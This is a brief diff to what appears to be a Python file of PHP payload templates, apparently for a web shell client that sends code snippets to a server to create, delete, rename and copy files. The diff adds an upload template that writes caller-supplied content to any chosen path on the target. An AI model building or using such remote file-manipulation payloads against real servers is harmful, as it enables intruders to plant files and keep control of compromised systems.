@@ -17,5 +17,9 @@ PHP_MKFILE = '''@@$file="##";$ff=fopen($file, "w");if($ff){echo 'done';}\
 PHP_DELETE = '''@@if(unlink("##")){echo 'done';}else{echo 'something err';}'''
 PHP_RENAME = '''@@if(rename("#1","#2")){echo 'done';}else{echo 'something err';}'''
 PHP_COPY = '''@@if(copy("#1","#2")){echo 'done';}else{echo 'something err';}'''
+
+PHP_UPLOAD ='''@@$file="#1";$strtofile="#2";$ff=fopen($file, "w");if($ff){echo 'done';\
+        fwrite($ff,$strtofile);}else{echo 'something err';}fclose($ff);'''
+
 PHP_test = '''$ff=fopen("newfile.txt","r");echo fgets($ff,1024);'''
 
